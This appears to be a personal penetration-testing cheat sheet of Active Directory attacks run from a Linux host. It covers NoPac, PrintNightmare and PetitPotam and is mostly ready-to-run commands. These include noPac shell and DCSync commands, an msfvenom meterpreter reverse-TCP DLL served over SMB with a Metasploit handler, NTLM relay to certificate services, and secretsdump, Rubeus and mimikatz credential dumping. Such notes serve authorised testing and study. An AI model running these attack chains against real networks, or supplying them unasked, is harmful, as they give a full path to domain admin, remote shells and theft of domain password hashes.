# From a Linux attack host
_______________________________________________________________________________________
## NoPac (SamAccountName Spoofing)
This vuln allow us for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.
Exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller : https://github.com/Ridter/noPac
### Install Impacket
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install 
```
### Cloning the NoPac Exploit Repo
```bash
git clone https://github.com/Ridter/noPac.git
```
### Scanning for NoPac
```bash
sudo python3 scanner.py mydomin.local/username:password -dc-ip 192.168.0.1 -use-ldap
```
### Running NoPac & Getting a Shell
could be "noisy" or may be blocked by AV or EDR.
```bash
sudo python3 noPac.py MYDOMAIN.LOCAL/username:password -dc-ip 192.168.0.1  -dc-host PC'S-NAME -shell --impersonate administrator -use-ldap
``` 
the TGT is saved in the directory on the attack host: administrator_PC'S-NAME.MYDOMAIN.local.ccache
We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. 
We can also use the tool with the -dump flag to perform a DCSync using secretsdump.py.

### Using noPac to DCSync the Built-in Administrator Account
```bash
sudo python3 noPac.py MYDOMAIN.LOCAL/username:password -dc-ip 192.168.0.1  -dc-host APC'S-NAME --impersonate administrator -use-ldap -dump -just-dc-user MYDOMAIN/administrator
```
### Windows Defender & SMBEXEC.py
If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail.
_______________________________________________________________________________________
## PrintNightmare
allow for privilege escalation and remote code execution.
### Cloning the Exploit
```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
# For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's 
```
### Install cube0x0's Version of Impacket
```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### Enumerating for MS-RPRN
We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
```bash
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```
### Generating a DLL Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=8080 -f dll > backupscript.dll
# We will then host this payload in an SMB share we create on our attack host using smbserver.py.
```
### Creating a Share with smbserver.py
```bash
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```
### Configuring & Starting MSF multi/handler
```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 192.168.0.1
LHOST => 10.10.10.100
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 192.168.0.100:8080 
```
### Running the Exploit
```bash
sudo python3 CVE-2021-1675.py mydomain.local/username:password@192.168.0.100 '\\192.168.0.1\CompData\backupscript.dll'
```
### Getting the SYSTEM Shell
```bash
(Meterpreter 1)(C:\Windows\system32) > shell
```
_______________________________________________________________________________________
## PetitPotam (MS-EFSRPC)
PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. 
The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC)
by abusing Microsoftâ€™s Encrypting File System Remote Protocol (MS-EFSRPC). 
https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
### Starting ntlmrelayx.py
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://PC'S-NAME.MYDOMAIN.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

### Running PetitPotam.py
```bash
python3 PetitPotam.py 192.168.0.1 192.168.0.100
.1 = attack host .100 = DC 
There is also a PowerShell implementation of the tool Invoke-PetitPotam.ps1.
```
### Catching Base64 Encoded Certificate for the PC
Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://PC'S-NAME.MYDOMAIN.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
### Requesting a TGT Using gettgtpkinit.py
Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.
```bash
python3 /opt/PKINITtools/gettgtpkinit.py MYDOMAIN.LOCAL/PC'S-NAME\$ -pfx-base64 Base64CertificateOfUser dc01.ccache
```
### Setting the KRB5CCNAME Environment Variable
The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
```bash
export KRB5CCNAME=dc01.ccache
```
### Using Domain Controller TGT to DCSync
We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.
```bash
secretsdump.py -just-dc-user MYDOMAIN/administrator -k -no-pass "PC'S-NAME$"@APC'S-NAME.MYDOMAIN.LOCAL
```
### Running klist
```bash
klist
```

### Confirming Admin Access to the Domain Controller
``` bash
crackmapexec smb 192.168.0.1 -u administrator -H 88ad09182de639ccc6579eb849751cf
88ad09182de639ccc6579eb0849751cf found with NOPAC or secretsdump.py
```
### Submitting a TGS Request for Ourselves Using getnthash.py
```bash
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5762386b3369aa16d912275 MYDOMAIN.LOCAL/PC'S-NAME$
```
### Using Domain Controller NTLM Hash to DCSync
```bash
secretsdump.py -just-dc-user MYDOMAIN/administrator "PC'S-NAME$"@192.168.0.1 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e1315b4919fb4ba
```
Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
### Requesting TGT and Performing PTT with DC01$ Machine Account (Rubeus)
```powershell
.\Rubeus.exe asktgt /user:PC'S-NAME$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
### Confirming the Ticket is in Memory
```powershell
klist
```
### Performing DCSync with Mimikatz
```powershell
lsadump::dcsync /user:inlanefreight\krbtgt
```




